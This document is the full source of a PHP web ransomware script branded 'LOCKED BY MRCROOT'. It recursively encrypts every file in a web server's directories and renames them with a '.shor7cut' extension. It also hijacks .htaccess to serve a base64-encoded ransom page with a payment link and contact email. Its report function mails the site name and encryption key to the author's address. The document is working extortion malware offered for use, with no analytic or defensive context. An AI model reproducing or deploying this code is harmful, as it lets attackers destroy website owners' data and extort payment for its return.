<!DOCTYPE html>
<html>
<head>
   <title>LOCKED BY MRCROOT</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{
    border-style: dotted;
    border-color: #379600;
    background-color: transparent;
    color: white;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: green;
    background-color: transparent;
    color: green;
}
.submite{
       border-style: dotted;
    border-color: #4CAF50;
    background-color: transparent;
    color: white;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htashor7cut")){
      rename(".htaccess", ".htashor7cut");
      if(fwrite(fopen('.htaccess', 'w'), "#Bug7sec Team\r\nDirectoryIndex shor7cut.php\r\nErrorDocument 404 /shor7cut.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("shor7cut.php", base64_decode("77u/PGh0bWw+IDxoZWFkPiA8dGl0bGU+bG9ja2VkIGJ5IG1yLmNyb290PC90aXRsZT4gPGlmcmFtZSB3aWRsbHRoPSIwJSIgaGVpZ2h0PSIwIiBzY3JvbGxpbmc9Im5vIiBmcmFtZWJvcmRlcj0ibm8iIGxvb3A9InRydWUiIGFsbG93PSJhdXRvcGxheSIgc3JjPSJodHRwczovLzUudG9wNHRvcC5uZXQvbV8xNDQ3M3VuOWIwLm1wMyI+PC9pZnJhbWU+PC9zdHlsZT4gPC9oZWFkPiA8bWV0YSBjb250ZW50PSdKQU5DT0snIG5hbWU9J2Rlc2NyaXB0aW9uJyAvPiA8bWV0YSBjb250ZW50PSdKQU5DT0snIG5hbWU9J2tleXdvcmRzJyAvPiA8bWV0YSBjb250ZW50PSdIYWNrZWQgQnkgTVIuQ1JPT1QnIG5hbWU9J0Fic3RyYWN0JyAvPiA8bWV0YSBuYW1lPSJ0aXRsZSIgY29udGVudD0iSGFja2VkIEJ5IG1yLmNyb290Ij4gPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IktPTlRPTCI+IDxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJIYWNrZWQgQnkgTVIuQ1JPT1QiPiA8bWV0YSBuYW1lPSJnb29nbGVib3QiIGNvbnRlbnQ9ImluZGV4LGZvbGxvdyIgLz4gPG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJhbGwiIC8+IDxtZXRhIG5hbWU9InJvYm90cyBzY2hlZHVsZSIgY29udGVudD0iYXV0byIgLz4gPG1ldGEgbmFtZT0iZGlzdHJpYnV0aW9uIiBjb250ZW50PSJnbG9iYWwiIC8+IDxtZXRhIGNvbnRhY3Q9JyMnIC8+IDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4gPHN0eWxlPiBodG1sLCBib2R5IHsgY29sb3I6ICM2MzZiNmY7IGZvbnQtZmFtaWx5OiAnRnJlZGVyaWNrYSB0aGUgR3JlYXQnLCBzYW5zLXNlcmlmOyBmb250LXdlaWdodDogMTAwOyBoZWlnaHQ6IDEwMHZoOyBtYXJnaW46IDA7IH0gLmZ1bGwtaGVpZ2h0IHsgaGVpZ2h0OiAxMDB2aDsgfSAuZmxleC1jZW50ZXIgeyBhbGlnbi1pdGVtczogY2VudGVyOyBkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgfSAucG9zaXRpb24tcmVmIHsgcG9zaXRpb246IHJlbGF0aXZlOyB9IC5jb250ZW50IHsgdGV4dC1hbGlnbjogY2VudGVyOyB9IC50aXRsZSB7IGZvbnQtc2l6ZTogMzZweDsgcGFkZGluZzogMjBweDsgfSA8L3N0eWxlPiA8Y2VudGVyPjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+ICogeyBtYXJnaW46MDsgcGFkZGluZzowOyB9IAlkaXYgeyAJZm9udC1mYW1pbHk6ICdNZXJpZW5kYSc7IH0gaHRtbCB7IGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBNZXJpZW5kYTsgbm8tcmVwZWF0IGNlbnRlciBjZW50ZXIgZml4ZWQ7IC13ZWJraXQtYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsgLW1vei1iYWNrZ3JvdW5kLXNpemU6IGNvdmVyOyAtby1iYWNrZ3JvdW5kLXNpemU6IGNvdmVyOyBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOyB9IC50ZXh0X2Q3bmV0IHsgZm9udC13ZWlnaHQ6MjAwcHg7IGZvbnQtc2l6ZToyMHB4OyBiYWNrZ3JvdW5kOiMwMDAwMDA7IGNvbG9yOiMzZTZhMDY7IHRleHQtc2hhZG93OiAtMXB4IC0xcHggMXB4IGdyZXksIC0xcHggLTFweCAzcHggZ3JleSwgMXB4IDFweCAxcHggc2lsdmVyLCAxcHggMXB4IDNweCBzaWx2ZXIsIDFweCAtMXB4IDFweCBncmV5LCAtMXB4IDFweCAxcHggZ3JleTsgfSAuc2Q3bmV0IHsgd2lkdGg6IDEwMCU7IG92ZXJmbG93OmhpZGRlbjsgLXdlYmtpdC1hbmltYXRpb246IHR5cGluZyA1cyBzdGVwcyg3MCwgZW5kKTsgYW5pbWF0aW9uOiBhbmltYXNpLWtldGlrIDVzIHN0ZXBzKDcwLCBlbmQpOyB9IEBrZXlmcmFtZXMgYW5pbWFzaS1rZXRpa3sgZnJvbSB7IHdpZHRoOiAwOyB9IH0gQC13ZWJraXQta2V5ZnJhbWVzIGFuaW1hc2kta2V0aWt7IGZyb20geyB3aWR0aDogMDsgfSB9IEBpbXBvcnQgdXJsKGh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1PcGVuK1NhbnM6NjAwKTsgYm9keSB7IGZvbnQtZmFtaWx5OiAnT3BlbiBTYW5zJywgJ3NhbnMtc2VyaWYnOyBjb2xvcjogI2NlY2VjZTsgYmFja2dyb3VuZDogIzAwMDAwMDsgb3ZlcmZsb3c6IGhpZGRlbjsgfSAuZDduZXQtMSwgLmQ3bmV0LTIsIC5kN25ldC0zLCAuZDduZXQtNCB7IAlwb3NpdGlvbjogYm90dG9tOyBkaXNwbGF5OiBibG9jazsgCXRvcDogMmVtOyAJZm9udC1mYW1pbHk6ICdNZXJpZW5kYSc7IAl0cmFuc3BhcmVudDsgd2lkdGg6IDYwJTsgZm9udC1zaXplOiAyNHB4OyAJYW5pbWF0aW9uLWR1cmF0aW9uOiAxNXM7IAlhbmltYXRpb24tdGltaW5nLWZ1bmN0aW9uOiBlYXNlLWluLW91dDsgCWFuaW1hdGlvbi1pdGVyYXRpb24tY291bnQ6IGluZmluaXRlOyB9IC5kN25ldC0xeyAJYW5pbWF0aW9uLW5hbWU6IGFuaW0tMTsgfSAuZDduZXQtMnsgCWFuaW1hdGlvbi1uYW1lOiBhbmltLTI7IH0gLmQ3bmV0LTN7IGFuaW1hdGlvbi1uYW1lOiBhbmltLTM7IH0gLmQ3bmV0LTR7IGFuaW1hdGlvbi1uYW1lOiBhbmltLTQ7IH0gQGtleWZyYW1lcyBhbmltLTEgeyAJMCUsIDguMyUgeyBsZWZ0OiAtMTAwJTsgb3BhY2l0eTogMDsgfSA4LjMlLDI1JSB7IGxlZnQ6IDI1JTsgb3BhY2l0eTogMTsgfSAzMy4zMyUsIDEwMCUgeyBsZWZ0OiAxMTAlOyBvcGFjaXR5OiAwOyB9IH0gQGtleWZyYW1lcyBhbmltLTIgeyAJMCUsIDMzLjMzJSB7IGxlZnQ6IC0xMDAlOyBvcGFjaXR5OiAwOyB9IDQxLjYzJSwgNTguMjklIHsgbGVmdDogMjUlOyBvcGFjaXR5OiAxOyB9IDY2LjY2JSwgMTAwJSB7IGxlZnQ6IDExMCU7IG9wYWNpdHk6IDA7IH0gfSBAa2V5ZnJhbWVzIGFuaW0tMyB7IDAlLCA2NS42NiUgeyBsZWZ0OiAtMTAwJTsgb3BhY2l0eTogMDsgfSA2MS42MyUsIDYwLjI5JSB7IGxlZnQ6IDI1JTsgb3BhY2l0eTogMTsgfSA5OS42NiUsIDEwMCUgeyBsZWZ0OiAxMTAlOyBvcGFjaXR5OiAwOyB9IH0gQGtleWZyYW1lcyBhbmltLTQgeyAwJSwgNTAuMTAlIHsgbGVmdDogLTEwMCU7IG9wYWNpdHk6IDA7IH0gNTUuMDAlLCA1Mi4wMCUgeyBsZWZ0OiAyNSU7IG9wYWNpdHk6IDE7IH0gNzUuMTAlLCAxMDAlIHsgbGVmdDogMTEwJTsgb3BhY2l0eTogMDsgfSB9IDwvc3R5bGU+PC9jZW50ZXI+IDwvaGVhZD4gPC9oZWFkPiA8ZGl2IGNsYXNzPSJzdGFycyI+IDxkaXYgY2xhc3M9InR3aW5rbGluZyI+IDxkaXYgY2xhc3M9ImZsZXgtY2VudGVyIHBvc2l0aW9uLXJlZiBmdWxsLWhlaWdodCI+IDxkaXYgY2xhc3M9ImNvbnRlbnQiPiA8ZW1iZWQgc3JjPSJodHRwOi8vd3d3LmN1YWltYXRlYW0udHYvQVVELTIwMTkxMTEyLVdBMDE2NS5tcDMiIHR5cGU9ImF1ZGlvL21wZWciIGF1dG9zdGFydD0idHJ1ZSIgbG9vcD0idHJ1ZSIgaGVpZ2h0PSIwIiB3aWR0aD0iMCI+PGJyPiA8ZGl2IGNsYXNzPSJ0ZXh0Ij48Zm9udCBjb2xvcj0iI0ZGRkZGRiI+IDxicj48aW1nIHNyYz0iaHR0cHM6Ly9lbmNyeXB0ZWQtdGJuMC5nc3RhdGljLmNvbS9pbWFnZXM/cT10Ym4lM0FBTmQ5R2NSTHVQN0FjcnVsOWZqQU8zTFpTRTh6TVhoZVNhMEFCOUZKOFEmdXNxcD1DQVUiIGhlaWdodD0iNDAwIj4gPGJyPjxicj48YnI+PGJyPiA8YnI+IDxmb250IHNpemU9IjciPjxiPjxpPjxtYXJxdWVlIHdpZHRoPSI1NSUiIGRpcmVjdGlvbj0icmlnaHQiIGJlaGF2aW9yPSJhbHRlcm5hdGUiIHNjcm9sbGFtb3VudD0iMjAiPn4kIGxvY2tlZCBieSBtci5jcm9vdCAkfjwvbWFycXVlZT48YnI+PGJyPnlvdXIgc2l0ZSBoYXMgYmVlbiBsb2NrZWQgcGxlYXNlIGNvbnRhY3QgbWUgZm9yIHRoZSBrZXkgISA8YnI+PGJyPjxicj48Yj4KPGNlbnRlcj48Y2VudGVyPjx0YWJsZSBib3JkZXI9IjEiPjx0aD4gPGZvbnQgY29sb3I9InJlZCI+PGEgaHJlZj0iaHR0cHM6Ly93d3cucGF5cGFsLm1lL21yY3Jvb3QiPjxmb250IGNvbG9yPSJyZWQiPjxmb250IHNpemU9IjUiPlBBWSBNRTwvYT48YnI+PHRoPiA8YTx0aD48YSBocmVmPSJtYWlsdG86bXJjcm9vdDQ2QGdtYWlsLmNvbT9zdWJqZWN0PUhhbGxvIFJleSZib2R5PUhhbGxvIEJhbmciPjxmb250IGNvbG9yPSJyZWQiPjxmb250IHNpemU9IjUiPkNPTlRBQ0sgTUU8L2E+CgoK"))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  shor7cut.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){

      if( file_exists(".htashor7cut") ){
        if( unlink(".htaccess") && unlink("shor7cut.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> shor7cut.php (Default Page)<br>';
        }
        rename(".htashor7cut", ".htaccess");
      }

   }

   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"ransom1.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"shor7cut.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htashor7cut") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }

   public function report($key){
        $message.= "=========      Ransomware  Wannacary =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= Ransomware Wannacary =========\n";
        $subject = "Report Ransomeware";
        $headers = "From: Ransomware <mrcroot46@gmail.com>\r\n";
        mail("mrcroot46@gmail.com",$subject,$message,$headers);
   }

   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".shor7cut");
        break;
        case '2':
          $locates = str_replace(".shor7cut", "", $locate);
          rename($locate, $locates);
        break;
      }
   }

   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );

      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }

   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }



   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}

if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<center>
<pre>

     <center>
 <br><img src="https://cdn.pixabay.com/photo/2016/12/20/14/35/virus-1920629_1280.png"width="300"height="300">
 <center>your site has been locked please contact me for the key ! 
 <center>-[ Contact : mrcroot46@gmail.com ]-
</pre>
<form action="" method="post" style=" text-align: center;">
      <label>Key : </label>
      <input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC">
      <select name="method" class="selecte">
         <option value="1">Infection</option>
         <option value="2">DeInfection</option>
      </select>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>
<?php
}?>
</div>
</body>
</html>


<?php

?>
